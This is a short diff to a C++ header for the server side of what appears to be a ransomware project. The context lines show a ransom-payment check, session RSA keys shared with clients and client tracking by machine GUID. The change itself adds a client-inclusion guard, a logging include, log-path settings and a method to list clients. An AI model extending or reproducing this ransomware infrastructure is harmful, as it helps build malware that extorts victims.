@@ -1,7 +1,12 @@
 #pragma once
 
+#ifdef CLIENT_RELEASE
+#error "Client should NOT included ServerInterface.h"
+#endif
+
 #include "Client.h"
 #include "External/json.hpp"
+#include "Logging.hpp"
 
 #include <mutex>
 
@@ -31,6 +36,7 @@ public:
     const inline auto ReadConfig()   const { return this->m_Config; };
     bool              IsClientInSaveFile(const std::string& machineGUID);
     void              RemoveClientFromServer(Client* client);
+    void              OutputClientList();
 
 protected:
     inline bool       IsRansomPaid(Client client) { return true; } // return true always. 
@@ -59,10 +65,14 @@ private:
     Server            m_UDPServerDetails;
     RSAKeys           m_SessionKeys; // RSA keys for the duration of the server session. public key is shared with clients
     NetworkManager    m_NetworkManager;
+    Logs              m_ServerLogs;
 
     struct {
         std::string   serverStatePath      = ".";
         std::string   serverStateFilename  = "server_state.json";
+        std::string   serverLogPath        = ".";
+        std::string   serverLogName        = "server.log";
+        std::string   serverLogFullPath    = serverLogPath + "\\" + serverLogName;
         std::string   serverStateFullPath  = serverStatePath + "\\" + serverStateFilename;
         std::string   serverConfigPath     = ".";
         std::string   serverConfigFilename = "server_conf.json";
